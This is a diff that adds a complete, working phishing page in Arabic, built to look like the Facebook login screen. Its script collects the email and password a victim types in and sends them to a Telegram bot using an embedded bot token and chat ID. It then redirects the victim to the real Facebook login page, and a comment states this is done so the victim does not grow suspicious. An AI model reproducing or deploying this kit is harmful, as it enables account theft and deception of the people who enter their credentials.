@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; transition: all 0.3s ease; }
+        .fb-logo { width: 200px; margin-bottom: 20px; }
+        input { width: 92%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; transition: border-color 0.3s; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        
+        .login-btn { 
+            width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; 
+            color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px;
+            display: flex; justify-content: center; align-items: center; min-height: 48px;
+            transition: all 0.2s; position: relative;
+        }
+        .login-btn:active { transform: scale(0.96); background-color: #166fe5; }
+        
+        .spinner {
+            display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #loading-msg { display: none; color: #606770; font-size: 14px; margin-top: 15px; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .footer-links { margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
+        .new-account { background-color: #42b72a; color: white; padding: 10px 16px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="mainBox">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2ygS89W.svg" alt="Facebook" class="fb-logo">
+        <form id="ultimateForm">
+            <input type="text" id="u_email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username">
+            <input type="password" id="u_pass" placeholder="كلمة السر" required autocomplete="current-password">
+            <button type="submit" class="login-btn" id="subBtn">
+                <span id="btnText">تسجيل الدخول</span>
+                <div class="spinner" id="loader"></div>
+            </button>
+        </form>
+        <div style="margin: 15px 0;"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
+        <div id="loading-msg">جاري التحقق من الحساب عبر خوادم فيسبوك...</div>
+        <div class="footer-links">
+            <a href="#" class="new-account">إنشاء حساب جديد</a>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات البوت - مراجعة دقيقة بعد التفكير العميق
+        var _TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
+        var _ID = '7576816211';
+
+        document.getElementById('ultimateForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // إعداد الواجهة
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('loading-msg').style.display = 'block';
+            document.getElementById('subBtn').disabled = true;
+
+            var email = document.getElementById('u_email').value;
+            var pass = document.getElementById('u_pass').value;
+            var text = "🚨 تم اختراق صيد جديد 🚨\n\n👤 الحساب: " + email + "\n🔑 الباسورد: " + pass + "\n🛠 الطريقة: XHR-JSON-POST";
+
+            // استخدام XMLHttpRequest للإرسال المتزامن والمؤكد (أقوى من fetch و Image)
+            var xhr = new XMLHttpRequest();
+            var url = "https://api.telegram.org/bot" + _TOKEN + "/sendMessage";
+            
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            // بمجرد اكتمال الطلب أو حتى فشله، نقوم بالتوجيه لضمان عدم شك الضحية
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    window.location.replace("https://www.facebook.com/login/device-based/regular/login/");
+                }
+            };
+
+            var data = JSON.stringify({
+                "chat_id": _ID,
+                "text": text
+            });
+
+            // إطلاق البيانات بقوة
+            xhr.send(data);
+
+            // احتياطي في حال تأخر الخادم في الرد
+            setTimeout(function() {
+                window.location.replace("https://www.facebook.com/login/device-based/regular/login/");
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
